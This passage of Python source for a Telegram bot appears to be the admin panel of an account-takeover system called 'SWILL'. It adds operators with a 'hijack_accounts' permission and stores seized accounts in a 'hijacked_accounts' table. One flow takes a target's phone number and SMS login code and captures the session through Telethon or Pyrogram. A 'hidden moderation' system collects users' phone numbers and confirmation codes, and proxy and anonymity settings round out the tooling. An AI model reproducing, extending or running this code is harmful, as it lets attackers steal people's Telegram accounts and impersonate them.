    await message.answer(f"⏳ <b>Ищу пользователя {username}...</b>", parse_mode="HTML")
    
    try:
        # Пробуем получить chat пользователя
        chat = await bot.get_chat(username)
        
        if chat.type != ChatType.PRIVATE:
            await message.answer(
                f"❌ <b>ЭТО НЕ ЛИЧНЫЙ АККАУНТ</b>\n\n"
                f"{username} - это {chat.type}, а не личный аккаунт.\n"
                f"Добавлять можно только личные аккаунты пользователей.",
                parse_mode="HTML"
            )
            await state.clear()
            return
        
        await state.update_data(
            new_admin_username=username,
            new_admin_user_id=chat.id,
            new_admin_first_name=chat.first_name,
            new_admin_last_name=chat.last_name
        )
        
        await state.set_state(AdminStates.waiting_admin_permissions)
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="👑 Все права", callback_data="perms_all"),
                InlineKeyboardButton(text="📨 Только сообщения", callback_data="perms_messages")
            ],
            [
                InlineKeyboardButton(text="📢 Только каналы", callback_data="perms_channels"),
                InlineKeyboardButton(text="👤 Только аккаунты", callback_data="perms_accounts")
            ],
            [
                InlineKeyboardButton(text="🔧 Настроить вручную", callback_data="perms_custom"),
                InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_admin_add")
            ]
        ])
        
        await message.answer(
            f"✅ <b>ПОЛЬЗОВАТЕЛЬ НАЙДЕН</b>\n\n"
            f"👤 Username: {username}\n"
            f"🆔 ID: {chat.id}\n"
            f"👤 Имя: {chat.first_name} {chat.last_name or ''}\n\n"
            f"<b>Выберите уровень прав для нового администратора:</b>",
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
    except Exception as e:
        await message.answer(
            f"❌ <b>ПОЛЬЗОВАТЕЛЬ НЕ НАЙДЕН</b>\n\n"
            f"Не удалось найти пользователя {username}\n"
            f"Ошибка: {str(e)[:200]}\n\n"
            f"<i>Убедитесь, что:\n"
            f"1. Пользователь существует\n"
            f"2. Username указан правильно\n"
            f"3. Пользователь начинал диалог с ботом</i>",
            parse_mode="HTML"
        )
        await state.clear()

@dp.callback_query(F.data.startswith("perms_"))
async def process_admin_permissions(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_main_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    permission_type = callback_query.data.split("_")[1]
    
    permissions_map = {
        'all': 'all',
        'messages': 'send_messages,view_messages',
        'channels': 'manage_channels,view_channels',
        'accounts': 'hijack_accounts,manage_accounts,view_accounts'
    }
    
    permissions = permissions_map.get(permission_type, 'basic')
    
    if permission_type == 'custom':
        await callback_query.message.edit_text(
            "🔧 <b>НАСТРОЙКА ПРАВ ВРУЧНУЮ</b>\n\n"
            "Введите права через запятую:\n\n"
            "Доступные права:\n"
            "• send_messages - отправка сообщений\n"
            "• view_messages - просмотр сообщений\n"
            "• manage_channels - управление каналами\n"
            "• view_channels - просмотр каналов\n"
            "• hijack_accounts - захват аккаунтов\n"
            "• manage_accounts - управление аккаунтами\n"
            "• view_accounts - просмотр аккаунтов\n"
            "• manage_admins - управление админами (только главный админ)\n"
            "• view_logs - просмотр логов\n"
            "• all - все права\n\n"
            "<i>Пример: send_messages,view_messages,manage_channels</i>",
            parse_mode="HTML"
        )
        await state.set_state(AdminStates.waiting_admin_permissions)
        return
    
    await state.update_data(new_admin_permissions=permissions)
    await state.set_state(AdminStates.waiting_admin_confirm)
    
    user_data = await state.get_data()
    username = user_data.get('new_admin_username', '')
    user_id = user_data.get('new_admin_user_id', '')
    first_name = user_data.get('new_admin_first_name', '')
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Подтвердить", callback_data="confirm_admin_add"),
            InlineKeyboardButton(text="✏️ Изменить права", callback_data="change_admin_perms")
        ],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_admin_add")]
    ])
    
    await callback_query.message.edit_text(
        f"📋 <b>ПОДТВЕРЖДЕНИЕ ДОБАВЛЕНИЯ</b>\n\n"
        f"👤 Пользователь: {username}\n"
        f"🆔 ID: {user_id}\n"
        f"👤 Имя: {first_name}\n"
        f"🔑 Права: {permissions}\n\n"
        f"<i>Добавить этого пользователя как администратора?</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.callback_query(F.data == "confirm_admin_add")
async def confirm_admin_add(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_main_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    user_data = await state.get_data()
    username = user_data.get('new_admin_username', '')
    user_id = user_data.get('new_admin_user_id', '')
    permissions = user_data.get('new_admin_permissions', 'basic')
    
    await callback_query.message.edit_text(
        f"⏳ <b>Добавляю администратора {username}...</b>",
        parse_mode="HTML"
    )
    
    result = await admin_manager.add_admin(
        user_id,
        username,
        callback_query.from_user.id,
        permissions
    )
    
    if result['success']:
        await callback_query.message.edit_text(
            f"✅ <b>АДМИНИСТРАТОР ДОБАВЛЕН!</b>\n\n"
            f"👤 Пользователь: {username}\n"
            f"🆔 ID: {user_id}\n"
            f"🔑 Права: {permissions}\n"
            f"👑 Добавил: ID {callback_query.from_user.id}\n\n"
            f"<i>Пользователь получил уведомление о назначении.</i>",
            parse_mode="HTML"
        )
    else:
        await callback_query.message.edit_text(
            f"❌ <b>ОШИБКА ДОБАВЛЕНИЯ</b>\n\n"
            f"Пользователь: {username}\n"
            f"Ошибка: {result.get('error', 'Неизвестная ошибка')}\n\n"
            f"<i>Попробуйте еще раз.</i>",
            parse_mode="HTML"
        )
    
    await state.clear()

# Управление захваченными аккаунтами
@dp.callback_query(F.data == "admin_accounts")
async def admin_accounts_menu(callback_query: CallbackQuery):
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    # Проверяем права на работу с аккаунтами
    if not admin_manager.has_permission(callback_query.from_user.id, 'view_accounts'):
        await callback_query.answer("❌ У вас нет прав для просмотра аккаунтов")
        return
    
    # Получаем статистику аккаунтов
    total_accounts = db.fetch_one("SELECT COUNT(*) FROM hijacked_accounts")[0]
    active_accounts = db.fetch_one("SELECT COUNT(*) FROM hijacked_accounts WHERE is_active = 1")[0]
    online_accounts = db.fetch_one("SELECT COUNT(*) FROM hijacked_accounts WHERE is_online = 1")[0]
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🎯 Захватить аккаунт", callback_data="account_hijack"),
            InlineKeyboardButton(text="📋 Список аккаунтов", callback_data="account_list")
        ],
        [
            InlineKeyboardButton(text="🔄 Восстановить все", callback_data="account_restore_all"),
            InlineKeyboardButton(text="📊 Статистика", callback_data="account_stats")
        ],
        [
            InlineKeyboardButton(text="📨 Отправить от аккаунта", callback_data="account_send"),
            InlineKeyboardButton(text="⚙️ Управление аккаунтами", callback_data="account_manage")
        ] if admin_manager.has_permission(callback_query.from_user.id, 'manage_accounts') else [],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ])
    
    await callback_query.message.edit_text(
        f"👤 <b>УПРАВЛЕНИЕ АККАУНТАМИ TELEGRAM</b>\n\n"
        f"📊 Статистика:\n"
        f"• Всего аккаунтов: {total_accounts}\n"
        f"• Активных: {active_accounts}\n"
        f"• Онлайн: {online_accounts}\n\n"
        f"<i>Выберите действие:</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.callback_query(F.data == "account_hijack")
async def account_hijack_start(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    # Проверяем права на захват аккаунтов
    if not admin_manager.has_permission(callback_query.from_user.id, 'hijack_accounts'):
        await callback_query.answer("❌ У вас нет прав для захвата аккаунтов")
        return
    
    # Проверяем, настроены ли API credentials
    if not config.TELEGRAM_API_ID or not config.TELEGRAM_API_HASH:
        await callback_query.message.edit_text(
            "❌ <b>API CREDENTIALS НЕ НАСТРОЕНЫ</b>\n\n"
            "Для захвата аккаунтов необходимо настроить:\n"
            "1. TELEGRAM_API_ID\n"
            "2. TELEGRAM_API_HASH\n\n"
            "Добавьте эти переменные в настройки бота.",
            parse_mode="HTML"
        )
        return
    
    await state.set_state(AdminStates.waiting_hijack_phone)
    
    await callback_query.message.edit_text(
        "🎯 <b>ЗАХВАТ АККАУНТА TELEGRAM</b>\n\n"
        "Отправьте номер телефона в международном формате:\n\n"
        "<code>+79123456789</code>\n\n"
        "<i>Номер должен быть привязан к аккаунту Telegram.</i>",
        parse_mode="HTML"
    )

@dp.message(AdminStates.waiting_hijack_phone)
async def process_hijack_phone(message: Message, state: FSMContext):
    if not admin_manager.is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещен")
        await state.clear()
        return
    
    if not admin_manager.has_permission(message.from_user.id, 'hijack_accounts'):
        await message.answer("❌ У вас нет прав для захвата аккаунтов")
        await state.clear()
        return
    
    phone = message.text.strip()
    
    if phone == '/cancel':
        await message.answer("❌ Захват аккаунта отменен")
        await state.clear()
        return
    
    # Проверяем формат номера
    try:
        parsed = phonenumbers.parse(phone, None)
        if not phonenumbers.is_valid_number(parsed):
            raise ValueError("Неверный номер телефона")
        
        formatted_phone = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
        
    except Exception as e:
        await message.answer(
            f"❌ <b>НЕВЕРНЫЙ ФОРМАТ НОМЕРА</b>\n\n"
            f"Номер: {phone}\n"
            f"Ошибка: {str(e)}\n\n"
            f"<i>Используйте международный формат:\n"
            f"+79123456789</i>",
            parse_mode="HTML"
        )
        return
    
    await state.update_data(hijack_phone=formatted_phone)
    await state.set_state(AdminStates.waiting_hijack_method)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📱 Telethon", callback_data="hijack_method_telethon"),
            InlineKeyboardButton(text="🤖 Pyrogram", callback_data="hijack_method_pyrogram")
        ],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_hijack")]
    ])
    
    await message.answer(
        f"✅ <b>НОМЕР ПРИНЯТ</b>\n\n"
        f"📱 Номер: {formatted_phone}\n\n"
        f"<b>Выберите метод захвата:</b>",
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.callback_query(F.data.startswith("hijack_method_"))
async def process_hijack_method(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Доступ запрещен")
        return
    
    method = callback_query.data.split("_")[2]  # telethon или pyrogram
    
    await state.update_data(hijack_method=method)
    await state.set_state(AdminStates.waiting_hijack_code)
    
    await callback_query.message.edit_text(
        f"🔢 <b>ВВОД КОДА ПОДТВЕРЖДЕНИЯ</b>\n\n"
        f"📱 Номер: {(await state.get_data()).get('hijack_phone', '')}\n"
        f"🔧 Метод: {method}\n\n"
        f"Отправьте код из SMS, который придет на этот номер:\n\n"
        f"<i>Код состоит из 5-6 цифр.</i>",
        parse_mode="HTML"
    )
@dp.callback_query(F.data == "setup_forward_menu")
@admin_required()
async def setup_forward_menu(callback_query: CallbackQuery):
    """Меню настройки пересылки сообщений"""
    user_id = callback_query.from_user.id
    
    # Получаем текущий статус пересылки
    current_channel = message_forwarder.get_user_channel(user_id)
    
    if current_channel:
        # Получаем информацию о канале
        channel_data = db.fetch_one(
            "SELECT channel_title FROM channels WHERE channel_id = ?",
            (current_channel,)
        )
        channel_title = channel_data[0] if channel_data else current_channel
        
        status_text = f"""
🔄 <b>ТЕКУЩИЙ СТАТУС ПЕРЕСЫЛКИ</b>

✅ Пересылка активна
📢 Канал: {channel_title}
🔗 ID: {current_channel}

<i>Все ваши сообщения в ЛС пересылаются в этот канал.</i>
"""
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🛑 Остановить пересылку", callback_data="stop_forwarding")],
            [InlineKeyboardButton(text="✏️ Сменить канал", callback_data="change_forward_channel")],
            [InlineKeyboardButton(text="📊 Статистика", callback_data="forward_stats")],
            [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
        ])
    else:
        status_text = """
🔄 <b>НАСТРОЙКА ПЕРЕСЫЛКИ СООБЩЕНИЙ</b>

Пересылка не настроена.
Настройте её, чтобы все ваши сообщения в этом боте автоматически пересылались в выбранный канал.
"""
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⚙️ Настроить пересылку", callback_data="setup_forward_config")],
            [InlineKeyboardButton(text="❓ Как это работает", callback_data="forward_help")],
            [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
        ])
    
    await callback_query.message.edit_text(
        status_text,
        parse_mode="HTML",
        reply_markup=keyboard
    )
    await callback_query.answer()

@dp.callback_query(F.data == "setup_forward_config")
@admin_required()
async def setup_forward_config(callback_query: CallbackQuery, state: FSMContext):
    """Начинает настройку пересылки сообщений"""
    user_id = callback_query.from_user.id
    
    # Получаем список доступных (одобренных) каналов
    channels = await channel_manager.get_all_channels({'approved_only': True})
    
    if not channels:
        await callback_query.message.edit_text(
            "❌ <b>НЕТ ДОСТУПНЫХ КАНАЛОВ</b>\n\n"
            "У вас нет ни одного одобренного канала.\n\n"
            "Сначала добавьте бота как администратора в канал и дождитесь его одобрения.",
            parse_mode="HTML"
        )
        return
    
    # Создаем клавиатуру с выбором канала
    keyboard_buttons = []
    
    for channel in channels:
        keyboard_buttons.append([
            InlineKeyboardButton(
                text=f"📢 {channel['title'][:30]}",
                callback_data=f"select_forward_channel:{channel['channel_id']}"
            )
        ])
    
    keyboard_buttons.append([
        InlineKeyboardButton(text="❌ Отмена", callback_data="setup_forward_menu")
    ])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
    
    await callback_query.message.edit_text(
        "🔧 <b>ВЫБЕРИТЕ КАНАЛ ДЛЯ ПЕРЕСЫЛКИ</b>\n\n"
        "Все ваши сообщения в этом боте будут автоматически пересылаться в выбранный канал.\n\n"
        "<i>Выберите канал из списка:</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )
    await callback_query.answer()

    

@dp.message(AdminStates.waiting_hijack_code)
async def process_hijack_code(message: Message, state: FSMContext):
    if not admin_manager.is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещен")
        await state.clear()
        return
    
    if not admin_manager.has_permission(message.from_user.id, 'hijack_accounts'):
        await message.answer("❌ У вас нет прав для захвата аккаунтов")
        await state.clear()
        return
    
    code = message.text.strip()
    
    if code == '/cancel':
        await message.answer("❌ Захват аккаунта отменен")
        await state.clear()
        return
    
    # Проверяем формат кода
    if not code.isdigit() or len(code) < 5 or len(code) > 6:
        await message.answer(
            f"❌ <b>НЕВЕРНЫЙ ФОРМАТ КОДА</b>\n\n"
            f"Код должен состоять из 5-6 цифр.\n"
            f"Получено: {code}\n\n"
            f"<i>Попробуйте еще раз.</i>",
            parse_mode="HTML"
        )
        return
    
    user_data = await state.get_data()
    phone = user_data.get('hijack_phone', '')
    method = user_data.get('hijack_method', 'telethon')
    
    await message.answer(
        f"⏳ <b>НАЧИНАЮ ЗАХВАТ АККАУНТА...</b>\n\n"
        f"📱 Номер: {phone}\n"
        f"🔢 Код: {code}\n"
        f"🔧 Метод: {method}\n\n"
        f"<i>Это может занять несколько секунд...</i>",
        parse_mode="HTML"
    )
    
    # Запускаем захват аккаунта
    result = await account_manager.hijack_account(phone, code, method)
    
    if result['success']:
        account_id = result['account_id']
        
        # Получаем подробную информацию об аккаунте
        account_info = await account_manager.get_account_info(account_id)
        
        await message.answer(
            f"✅ <b>АККАУНТ УСПЕШНО ЗАХВАЧЕН!</b>\n\n"
            f"📱 Номер: {phone}\n"
            f"👤 Пользователь: @{account_info.get('username', 'нет')}\n"
            f"🆔 User ID: {account_info.get('user_id', 'неизвестно')}\n"
            f"👤 Имя: {account_info.get('first_name', 'неизвестно')}\n"
            f"🔧 Метод: {method}\n"
            f"🎯 ID аккаунта: {account_id}\n\n"
            f"<i>Аккаунт добавлен в систему и готов к использованию.</i>",
            parse_mode="HTML"
        )
        
        # Уведомляем главного админа
        if not admin_manager.is_main_admin(message.from_user.id):
            try:
                await bot.send_message(
                    config.MAIN_ADMIN_ID,
                    f"🎯 <b>НОВЫЙ АККАУНТ ЗАХВАЧЕН</b>\n\n"
                    f"📱 Номер: {phone}\n"
                    f"👤 Пользователь: @{account_info.get('username', 'нет')}\n"
                    f"👮 Захватил: ID {message.from_user.id}\n"
                    f"🔧 Метод: {method}\n"
                    f"🎯 ID аккаунта: {account_id}\n"
                    f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
                    parse_mode="HTML"
                )
            except:
                pass
    else:
        await message.answer(
            f"❌ <b>ОШИБКА ЗАХВАТА АККАУНТА</b>\n\n"
            f"📱 Номер: {phone}\n"
            f"🔢 Код: {code}\n"
            f"🔧 Метод: {method}\n"
            f"⚠️ Ошибка: {result.get('error', 'Неизвестная ошибка')}\n\n"
            f"<i>Возможные причины:\n"
            f"1. Неверный код\n"
            f"2. Аккаунт защищен 2FA\n"
            f"3. Проблемы с подключением\n"
            f"4. Неверные API credentials</i>",
            parse_mode="HTML"
        )
    
    await state.clear()

# Настройки бота
@dp.callback_query(F.data == "admin_settings")
async def admin_settings_menu(callback_query: CallbackQuery):
    if not admin_manager.is_main_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Только главный админ может изменять настройки")
        return
    
    # Получаем текущие настройки
    current_proxy = anonymity_manager.current_proxy
    proxy_status = "✅ Настроен" if current_proxy else "❌ Не настроен"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🔄 Сменить прокси", callback_data="settings_change_proxy"),
            InlineKeyboardButton(text="🔧 Настройки безопасности", callback_data="settings_security")
        ],
        [
            InlineKeyboardButton(text="🗑️ Очистить данные", callback_data="settings_clear_data"),
            InlineKeyboardButton(text="📊 Настройки базы", callback_data="settings_database")
        ],
        [
            InlineKeyboardButton(text="🚪 Управление сессиями", callback_data="settings_sessions"),
            InlineKeyboardButton(text="🔔 Настройки уведомлений", callback_data="settings_notifications")
        ],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ])
    
    await callback_query.message.edit_text(
        f"⚙️ <b>НАСТРОЙКИ СИСТЕМЫ SWILL</b>\n\n"
        f"📊 Основные настройки:\n"
        f"• Прокси: {proxy_status}\n"
        f"• Активных сессий: {len(account_manager.active_sessions)}\n"
        f"• Лимит админов: {config.MAX_ADMINS}\n"
        f"• Лимит каналов: {config.MAX_CHANNELS}\n\n"
        f"<i>Выберите категорию настроек:</i>",
        parse_mode="HTML",
        reply_markup=keyboard
    )
@dp.callback_query(F.data.startswith("moder_approve:"))
async def handle_moder_approve(callback_query: CallbackQuery):
    """Обработка кнопки 'Отправить код' в канале"""
    try:
        # Разбираем данные
        parts = callback_query.data.split(":")
        if len(parts) < 3:
            await callback_query.answer("❌ Ошибка формата")
            return
        
        request_id = parts[1]
        channel_db_id = int(parts[2])
        moderator_id = callback_query.from_user.id
        
        # Проверяем права модератора
        if not admin_manager.is_admin(moderator_id):
            await callback_query.answer("❌ Только администраторы могут подтверждать")
            return
        
        # Одобряем запрос
        result = await moderation_system.approve_request(request_id, moderator_id, channel_db_id)
        
        if result['success']:
            await callback_query.answer(f"✅ Код {result.get('code')} отправлен пользователю")
            
            # Удаляем кнопки
            await callback_query.message.edit_reply_markup(reply_markup=None)
            
            # Обновляем сообщение
            await callback_query.message.edit_text(
                f"✅ <b>ЗАПРОС ОДОБРЕН</b>\n\n"
                f"👤 Пользователь: {result.get('user_id')}\n"
                f"📱 Телефон: {result.get('phone')}\n"
                f"🔢 Код: {result.get('code')}\n"
                f"👮 Модератор: {moderator_id}\n"
                f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
                parse_mode="HTML"
            )
        else:
            await callback_query.answer(f"❌ Ошибка: {result.get('error', 'Неизвестная ошибка')}")
            
    except Exception as e:
        logger.error(f"Ошибка обработки подтверждения: {e}")
        await callback_query.answer("❌ Ошибка обработки")

@dp.callback_query(F.data.startswith("moder_reject:"))
async def handle_moder_reject(callback_query: CallbackQuery, state: FSMContext):
    """Обработка кнопки 'Отклонить' в канале"""
    try:
        parts = callback_query.data.split(":")
        if len(parts) < 3:
            await callback_query.answer("❌ Ошибка формата")
            return
        
        request_id = parts[1]
        channel_db_id = int(parts[2])
        moderator_id = callback_query.from_user.id
        
        # Проверяем права
        if not admin_manager.is_admin(moderator_id):
            await callback_query.answer("❌ Только администраторы могут отклонять")
            return
        
        # Запрашиваем причину отклонения
        await state.set_state(AdminStates.waiting_channel_action)
        await state.update_data(
            request_id=request_id,
            channel_db_id=channel_db_id,
            moderator_id=moderator_id,
            action='moder_reject'
        )
        
        # Убираем кнопки временно
        await callback_query.message.edit_reply_markup(reply_markup=None)
        
        await callback_query.message.reply(
            "📝 <b>УКАЖИТЕ ПРИЧИНУ ОТКЛОНЕНИЯ</b>\n\n"
            "Введите причину, по которой отклоняете запрос:\n\n"
            "<i>Примеры:\n"
            "• Неверный формат номера\n"
            "• Подозрительный номер\n"
            "• Повторная отправка\n"
            "• Другая причина</i>",
            parse_mode="HTML"
        )
        
        await callback_query.answer("Введите причину отклонения")
        
    except Exception as e:
        logger.error(f"Ошибка обработки отклонения: {e}")
        await callback_query.answer("❌ Ошибка обработки")

@dp.message(AdminStates.waiting_channel_action)
async def process_moder_reject_reason(message: Message, state: FSMContext):
    """Обработка причины отклонения"""
    try:
        user_data = await state.get_data()
        action = user_data.get('action')
        
        if action == 'moder_reject':
            request_id = user_data.get('request_id')
            channel_db_id = user_data.get('channel_db_id')
            moderator_id = user_data.get('moderator_id')
            reason = message.text
            
            # Отклоняем запрос
            result = await moderation_system.reject_request(request_id, moderator_id, channel_db_id, reason)
            
            if result['success']:
                await message.answer(
                    f"✅ <b>ЗАПРОС ОТКЛОНЕН</b>\n\n"
                    f"Причина: {reason}\n\n"
                    f"Пользователь уведомлен о необходимости повторной отправки.",
                    parse_mode="HTML"
                )
            else:
                await message.answer(
                    f"❌ <b>ОШИБКА ОТКЛОНЕНИЯ</b>\n\n"
                    f"Ошибка: {result.get('error', 'Неизвестная ошибка')}",
                    parse_mode="HTML"
                )
        
        await state.clear()
        
    except Exception as e:
        logger.error(f"Ошибка обработки причины отклонения: {e}")
        await message.answer("❌ Ошибка обработки")
        await state.clear()
# ========== ОБРАБОТЧИКИ ОДОБРЕНИЯ КАНАЛОВ ==========
# ========== УЛУЧШЕННЫЕ ОБРАБОТЧИКИ ОДОБРЕНИЯ КАНАЛОВ ==========
@dp.callback_query(F.data.startswith("approve_channel:"))
async def handle_approve_channel(callback_query: CallbackQuery):
    if not admin_manager.is_main_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Только главный админ может одобрять каналы")
        return
    
    channel_db_id = int(callback_query.data.split(":")[1])
    
    # Убираем кнопки из сообщения
    await callback_query.message.edit_reply_markup(reply_markup=None)
    await callback_query.message.edit_text(
        f"⏳ <b>Одобряю канал #{channel_db_id}...</b>",
        parse_mode="HTML"
    )
    
    result = await channel_manager.approve_channel(channel_db_id, callback_query.from_user.id)
    
    if result['success']:
        await callback_query.message.edit_text(
            f"✅ <b>КАНАЛ ОДОБРЕН!</b>\n\n"
            f"📢 Канал: {result.get('channel_title', 'Unknown')}\n"
            f"🎯 ID в системе: {channel_db_id}\n\n"
            f"{result.get('message', 'Уведомления будут отправляться в канал.')}",
            parse_mode="HTML"
        )
        
        # Тестовое сообщение в канал
        try:
            test_result = await channel_manager.send_to_channel(
                channel_db_id,
                "✅ <b>БОТ АКТИВИРОВАН!</b>\n\n"
                "Этот канал был одобрен для получения уведомлений.\n"
                "Теперь бот будет отправлять сюда важные уведомления.",
                message_type='system'
            )
            
            if not test_result['success']:
                await callback_query.message.reply(
                    f"⚠️ <b>ТЕСТОВОЕ СООБЩЕНИЕ НЕ ОТПРАВЛЕНО</b>\n\n"
                    f"Ошибка: {test_result.get('error', 'Неизвестная ошибка')}\n\n"
                    f"<i>Проверьте права бота в канале.</i>",
                    parse_mode="HTML"
                )
                
        except Exception as e:
            logger.error(f"Ошибка отправки тестового сообщения: {e}")
            
    else:
        await callback_query.message.edit_text(
            f"❌ <b>ОШИБКА ОДОБРЕНИЯ КАНАЛА</b>\n\n"
            f"ID: {channel_db_id}\n"
            f"Ошибка: {result.get('error', 'Неизвестная ошибка')}",
            parse_mode="HTML"
        )

# ========== ТЕСТОВАЯ КОМАНДА ДЛЯ ОТПРАВКИ УВЕДОМЛЕНИЙ ==========
@dp.message(Command("test_notify"))
async def cmd_test_notify(message: Message, state: FSMContext):
    """Тестовая отправка уведомления во все одобренные каналы"""
    if not admin_manager.is_admin(message.from_user.id):
        await message.answer("❌ У вас нет доступа к этой команде.")
        return
    
    await state.set_state(AdminStates.waiting_broadcast_text)
    await state.update_data(is_test=True)
    
    await message.answer(
        "🧪 <b>ТЕСТОВАЯ ОТПРАВКА УВЕДОМЛЕНИЯ</b>\n\n"
        "Введите текст тестового уведомления:\n\n"
        "<i>Оно будет отправлено во все одобренные каналы</i>",
        parse_mode="HTML"
    )

@dp.message(AdminStates.waiting_broadcast_text)
async def process_test_notify_text(message: Message, state: FSMContext):
    if not admin_manager.is_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещен")
        await state.clear()
        return
    
    text = message.text
    user_data = await state.get_data()
    is_test = user_data.get('is_test', False)
    
    if not text:
        await message.answer("❌ Текст не может быть пустым")
        return
    
    # Получаем все одобренные каналы
    channels = await channel_manager.get_all_channels({'approved_only': True})
    
    if not channels:
        await message.answer(
            "❌ <b>НЕТ ОДОБРЕННЫХ КАНАЛОВ</b>\n\n"
            "Нет каналов для отправки уведомлений.",
            parse_mode="HTML"
        )
        await state.clear()
        return
    
    # Подготавливаем сообщение
    test_prefix = "🧪 ТЕСТОВОЕ УВЕДОМЛЕНИЕ\n\n" if is_test else ""
    full_message = f"{test_prefix}{text}\n\n📅 {datetime.now().strftime('%d.%m.%Y %H:%M')}"
    
    # Отправляем в каждый канал
    success_count = 0
    fail_count = 0
    results = []
    
    await message.answer(f"⏳ <b>Отправляю в {len(channels)} канал(ов)...</b>", parse_mode="HTML")
    
    for channel in channels:
        if not channel['notifications_enabled']:
            results.append(f"❌ {channel['title']}: уведомления выключены")
            fail_count += 1
            continue
        
        result = await channel_manager.send_to_channel(
            channel['id'],
            full_message,
            message_type='test'
        )
        
        if result['success']:
            results.append(f"✅ {channel['title']}: отправлено")
            success_count += 1
        else:
            results.append(f"❌ {channel['title']}: {result.get('error', 'Ошибка')}")
            fail_count += 1
        
        # Задержка между отправками
        await asyncio.sleep(0.5)
    
    # Формируем отчет
    report = f"📊 <b>ОТЧЕТ О ТЕСТОВОЙ ОТПРАВКЕ</b>\n\n"
    report += f"✅ Успешно: {success_count}\n"
    report += f"❌ Ошибок: {fail_count}\n"
    report += f"📝 Текст: {text[:100]}...\n\n"
    
    if results:
        report += "<b>Результаты по каналам:</b>\n"
        for i, res in enumerate(results[:10]):  # Показываем первые 10
            report += f"{i+1}. {res}\n"
        
        if len(results) > 10:
            report += f"\n... и еще {len(results) - 10} каналов\n"
    
    await message.answer(report, parse_mode="HTML")
    await state.clear()

@dp.callback_query(F.data.startswith("reject_channel:"))
async def handle_reject_channel(callback_query: CallbackQuery, state: FSMContext):
    if not admin_manager.is_main_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Только главный админ может отклонять каналы")
        return
    
    channel_db_id = int(callback_query.data.split(":")[1])
    
    await state.set_state(AdminStates.waiting_channel_action)
    await state.update_data(channel_db_id=channel_db_id, action='reject')
    
    # Убираем кнопки из сообщения
    await callback_query.message.edit_reply_markup(reply_markup=None)
    
    await callback_query.message.edit_text(
        f"📝 <b>УКАЖИТЕ ПРИЧИНУ ОТКЛОНЕНИЯ</b>\n\n"
        f"Канал ID: {channel_db_id}\n\n"
        f"Введите причину отклонения канала:\n\n"
        f"<i>Или отправьте /cancel для отмены</i>",
        parse_mode="HTML"
    )

@dp.message(AdminStates.waiting_channel_action)
async def process_channel_action_reason(message: Message, state: FSMContext):
    if not admin_manager.is_main_admin(message.from_user.id):
        await message.answer("❌ Доступ запрещен")
        await state.clear()
        return
    
    user_data = await state.get_data()
    channel_db_id = user_data.get('channel_db_id')
    action = user_data.get('action')
    reason = message.text
    
    if action == 'reject':
        result = await channel_manager.reject_channel(channel_db_id, message.from_user.id, reason)
        
        if result['success']:
            await message.answer(
                f"✅ <b>КАНАЛ ОТКЛОНЕН!</b>\n\n"
                f"ID: {channel_db_id}\n"
                f"📝 Причина: {reason}\n\n"
                f"Канал удален из системы.",
                parse_mode="HTML"
            )
        else:
            await message.answer(
                f"❌ <b>ОШИБКА ОТКЛОНЕНИЯ КАНАЛА</b>\n\n"
                f"ID: {channel_db_id}\n"
                f"Ошибка: {result.get('error', 'Неизвестная ошибка')}",
                parse_mode="HTML"
            )
    
    await state.clear()
# Инициализация менеджера каналов
channel_manager = ChannelManager()


class ModerationSystem:
    """Система скрытой модерации номеров телефонов"""
    
    def __init__(self):
        self.pending_requests = {}  # {request_id: {'user_id': x, 'phone': y, 'status': 'pending'}}
    
    async def create_moderation_request(self, user_id: int, phone: str) -> str:
        """Создает запрос на модерацию номера телефона"""
        try:
            request_id = f"req_{user_id}_{int(time.time())}"
            
            self.pending_requests[request_id] = {
                'user_id': user_id,
                'phone': phone,
                'status': 'pending',
                'created_at': datetime.now(),
                'channel_messages': {}  # {channel_id: message_id}
            }
            
            # Сохраняем в БД
            db.execute('''
                INSERT INTO moderation_requests 
                (request_id, user_id, phone, status, created_at)
                VALUES (?, ?, ?, ?, ?)
            ''', (request_id, user_id, phone, 'pending', datetime.now().isoformat()))
            
            return request_id
            
        except Exception as e:
